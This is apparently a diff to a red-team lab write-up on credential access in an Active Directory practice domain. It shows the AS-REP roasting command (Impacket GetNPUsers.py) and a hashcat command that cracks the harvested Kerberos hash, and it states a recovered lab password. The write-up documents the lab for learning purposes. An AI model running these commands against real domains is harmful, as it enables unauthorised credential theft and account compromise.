@@ -1,13 +1,22 @@
 🔐 Case 002: Credential Access (AS-REP Roasting & Kerberoasting)
 ⚔️ Red Team: Attack Simulation
 1. AS-REP Roasting (Impacket)
-Using the username list harvested in Case 001, the attacker performed an AS-REP Roast to identify accounts where Kerberos pre-authentication is not required.
+Using the username list harvested in Case 001, an AS-REP Roast was performed to identify accounts vulnerable to credential harvesting without authentication.
 
 Command: GetNPUsers.py north.sevenkingdoms.local/ -no-pass -usersfile users.txt
 
-Objective: Retrieve an encrypted Kerberos AS-REP ticket for offline password cracking.
+Target: brandon.stark@NORTH.SEVENKINGDOMS.LOCAL
 
-Key Finding: Successfully retrieved a hash for brandon.stark@NORTH.SEVENKINGDOMS.LOCAL. All other users in the list correctly have pre-authentication enforced.
+Finding: The account was identified as having UF_DONT_REQUIRE_PREAUTH set, allowing for the extraction of a crackable Kerberos hash.
 
-📸 Evidence: Successful AS-REP Ticket Harvesting
-<img width="1915" height="474" alt="image" src="https://github.com/user-attachments/assets/758a9d47-f8b8-4a0f-905e-5a818bef98fe" />
+2. Offline Password Cracking (Hashcat)
+The harvested hash was subjected to an offline dictionary attack to recover the plaintext password.
+
+Command: hashcat -m 18200 asrep.hash /opt/wordlist/rockyou.txt
+
+Result: CRACKED
+
+Recovered Password: iseedeadpeople
+
+📸 Evidence: Successful Credential Recovery
+<img width="1919" height="596" alt="image" src="https://github.com/user-attachments/assets/ee42923a-fed5-4235-a588-75ae456fd5d3" />
